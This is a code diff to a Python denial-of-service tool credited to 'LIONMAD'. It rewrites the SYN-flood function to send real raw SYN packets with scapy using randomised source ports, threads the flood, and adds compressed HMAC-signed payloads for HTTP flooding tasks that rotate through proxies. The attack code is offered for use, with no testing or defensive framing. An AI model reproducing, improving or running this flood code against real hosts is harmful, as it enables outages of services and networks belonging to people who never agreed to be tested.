@@ -3,36 +3,36 @@
 # Author: LIONMAD
 
 # Standard Libraries
-import aiohttp  # Asynchronous HTTP requests and responses
-import asyncio  # Asynchronous programming and concurrency
-import time  # Time-related functions (e.g., delays, timestamps)
-import argparse  # Command-line argument parsing
-import threading  # Multi-threading support
-from concurrent.futures import ThreadPoolExecutor, as_completed  # Thread/process pools for parallel execution
-import random  # Random number generation and selections
-import json  # JSON serialization and deserialization
-from itertools import cycle  # Cycles through an iterable indefinitely
-from collections import deque  # Double-ended queue for fast appends/pops
-from uuid import uuid4  # Generates unique identifiers (UUIDs)
-from base64 import b64encode  # Encodes binary data into base64 ASCII strings
-import hashlib  # Hashing algorithms like SHA and MD5
-import zlib  # Compression and decompression functions
-import hmac  # HMAC (keyed-hash message authentication)
-import signal  # Handles asynchronous events and signals
-import sys  # System-specific parameters and functions
-import os  # Operating system interactions
-import subprocess  # Running and managing subprocesses
-import socket  # Networking interfaces for communication
-import struct  # Packing/unpacking binary data
-import logging  # Logging for debugging and system events
-import psutil  # Access to system and process utilities (CPU, memory, etc.)
+import aiohttp
+import asyncio
+import time
+import argparse
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import random
+import json
+from itertools import cycle
+from collections import deque
+from uuid import uuid4
+from base64 import b64encode
+import hashlib
+import zlib  # Used for compressing payloads
+import hmac  # Used for signing payloads
+import signal
+import sys
+import os
+import subprocess
+import socket
+import struct  # Used for packing binary data
+import logging
+import psutil  # Used for monitoring system resources
 
 # Third-Party Libraries
-import scapy.all as scapy  # Network packet crafting, sending, and analysis
-import dns.resolver  # DNS queries and resolution (from dnspython)
-from colorama import init, Fore, Style  # Terminal text formatting with colors
-from tqdm import tqdm  # Progress bar display for loops
-import openai  # Interacting with OpenAI APIs (e.g., ChatGPT, DALL-E)
+import scapy.all as scapy  # Used for crafting custom packets
+import dns.resolver
+from colorama import init, Fore, Style
+from tqdm import tqdm
+import openai  # Used for AI-powered suggestions
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
@@ -144,12 +144,25 @@ async def check_proxy(proxy: str):
 def generate_payload(payload_type: str):
     """Generate a payload for HTTP requests."""
     payload_id = str(uuid4())
+    data = b64encode(os.urandom(64)).decode()
+    payload = {"id": payload_id, "data": data}
+
+    # Sign the payload using HMAC
+    secret_key = b"your_secret_key"  # Replace with a secure key
+    payload_str = json.dumps(payload)
+    signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
+    payload["signature"] = signature
+
+    # Compress the payload using zlib
     if payload_type == "json":
-        return json.dumps({"id": payload_id, "data": b64encode(os.urandom(64)).decode()})
+        compressed_payload = zlib.compress(json.dumps(payload).encode())
+        return compressed_payload
     elif payload_type == "xml":
-        return f"<data><id>{payload_id}</id><value>{b64encode(os.urandom(64)).decode()}</value></data>"
+        xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
+        compressed_payload = zlib.compress(xml_payload.encode())
+        return compressed_payload
     elif payload_type == "form":
-        return {"id": payload_id, "data": b64encode(os.urandom(64)).decode()}
+        return payload
     else:
         return None
 
@@ -217,15 +230,16 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                 await asyncio.sleep(pause_time)
 
 def syn_flood(target_ip, target_port, duration):
-    """Perform a SYN flood attack."""
+    """Perform a SYN flood attack using scapy."""
     print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
-            s.sendall(b"SYN")
-            s.close()
+            # Craft a SYN packet using scapy
+            ip_layer = scapy.IP(dst=target_ip)
+            tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+            packet = ip_layer / tcp_layer
+            scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during SYN flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
@@ -250,9 +264,11 @@ def display_status(stop_event: threading.Event, duration: int, results_file=None
                     "Successful Requests": successful_requests,
                     "Failed Requests": failed_requests,
                     "RPS": rps,
+                    "CPU Usage": psutil.cpu_percent(),
+                    "Memory Usage": psutil.virtual_memory().percent,
                 }
                 results.append(stats)
-                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}")
+                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f} | CPU: {stats['CPU Usage']}% | Memory: {stats['Memory Usage']}%{RESET}")
             pbar.update(1)
             time.sleep(1)
 
@@ -348,34 +364,34 @@ async def main():
     if args.attack_mode == "syn-flood":
         target_ip = await resolve_target(target)
         target_port = 80  # Default port for SYN flood
-        syn_flood(target_ip, target_port, args.duration)
+        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
     else:
         for _ in range(args.threads):
             task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
             tasks.append(task)
 
-    display_thread = threading.Thread(
-        target=display_status, args=(stop_event, args.duration, args.results)
-    )
-    display_thread.daemon = True
-    display_thread.start()
+        # Display status in a separate thread
+        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
 
-    signal.signal(signal.SIGINT, signal_handler)
+    # Wait for the specified duration, then stop all tasks
+    await asyncio.sleep(args.duration)
+    stop_event.set()
 
-    try:
-        await asyncio.sleep(args.duration)
-    except KeyboardInterrupt:
-        print(f"{RED}Interrupted by user.{RESET}")
-    finally:
-        stop_event.set()
-        await asyncio.gather(*tasks)
+    # Wait for all asyncio tasks to complete
+    await asyncio.gather(*tasks, return_exceptions=True)
 
-    with requests_lock:
-        rps_stats = calculate_rps_stats()
-        print(f"{GREEN}Test completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps_stats['avg']:.2f}{RESET}")
+    # Display final statistics
+    stats = calculate_rps_stats()
+    print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")
 
-    # Execute custom command with AI-powered suggestions
-    execute_custom_command()
+    if args.results:
+        print(f"{GREEN}Results saved to {args.results}{RESET}")
+
 
 if __name__ == "__main__":
+    # Handle signals for graceful exit
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+    # Run the asyncio event loop
     asyncio.run(main())
